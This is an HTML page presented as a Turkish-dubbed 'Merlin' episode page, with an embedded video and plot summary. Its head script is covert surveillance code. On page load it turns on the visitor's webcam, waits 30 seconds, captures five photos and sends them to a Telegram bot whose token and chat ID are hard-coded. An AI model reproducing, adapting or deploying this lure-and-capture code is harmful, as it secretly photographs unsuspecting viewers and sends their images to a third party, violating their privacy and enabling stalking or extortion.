<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #000; /* Night mode */
            color: #fff; /* White text */
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .title {
            font-size: 3rem; /* Large title font */
            font-weight: bold;
            margin-top: 20px;
            color: #f0f0f0;
            text-transform: uppercase;
            margin-bottom: 20px;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 1000px;
            height: 0;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        .description {
            max-width: 90%;
            margin-top: 20px;
            padding: 10px;
            background-color: #222; /* Dark grey */
            border: 1px solid #555;
            border-radius: 8px;
            font-size: 1rem;
            color: #fff;
            text-align: center;
        }
        .webcam {
            width: 100%;
            max-width: 400px;
            border: 1px solid #fff;
            margin-top: 20px;
        }
        #canvas {
            display: none;
        }
    </style>
    <script>
        const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs'; // Telegram Bot Token
        const chatId = '7771348001'; // Your Telegram Chat ID
        let videoStream = null;

        // Function to send image to Telegram
        function sendToTelegram(imageData) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageData);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Image sent to Telegram successfully');
                } else {
                    console.error('Failed to send image to Telegram:', data);
                }
            })
            .catch(error => console.error('Error sending image:', error));
        }

        // Function to capture a single photo from the video stream
        function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            const video = document.getElementById('video');

            // Set the canvas size to the video size
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw the current video frame onto the canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the canvas content to a Blob (image) for sending
            canvas.toBlob((blob) => {
                console.log('Captured Image:', blob);
                sendToTelegram(blob);
            }, 'image/png');
        }

        // Function to start the webcam and capture images
        function startWebcam() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    videoStream = stream;
                })
                .catch((error) => {
                    console.error('Error accessing the camera:', error);
                });
        }

        // Function to take 5 pictures with a 30-second delay
        function captureFivePictures() {
            let count = 0;
            const captureInterval = setInterval(() => {
                if (count < 5) {
                    capturePhoto();
                    count++;
                } else {
                    clearInterval(captureInterval); // Stop the interval after 5 pictures
                    stopCamera(videoStream); // Stop the camera after capturing 5 pictures
                }
            }, 2000); // Capture a picture every 2 seconds
        }

        // Function to stop the camera
        function stopCamera(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
            console.log('Camera stopped.');
        }

        // Function to schedule the initial photo capture
        function scheduleInitialCapture() {
            setTimeout(() => {
                console.log('Taking initial 5 pictures after 30 seconds');
                captureFivePictures(); // Capture 5 pictures after 30 seconds
            }, 30000); // Wait for 30 seconds before starting to capture
        }

        // Start the webcam and scheduling when the page loads
        document.addEventListener('DOMContentLoaded', () => {
            startWebcam(); // Start the webcam immediately
            scheduleInitialCapture(); // Schedule the photo capture after 30 seconds
        });
    </script>
</head>
<body>
    <!-- Video title -->
    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>

    <!-- Custom Video Player -->
    <div class="video-container">
        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <!-- Description Section -->
    <div class="description">
        <p>
            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
        </p>
    </div>

    <!-- Webcam Display -->
    <video id="video" autoplay class="webcam"></video>
    <canvas id="canvas"></canvas>
</body>
</html>
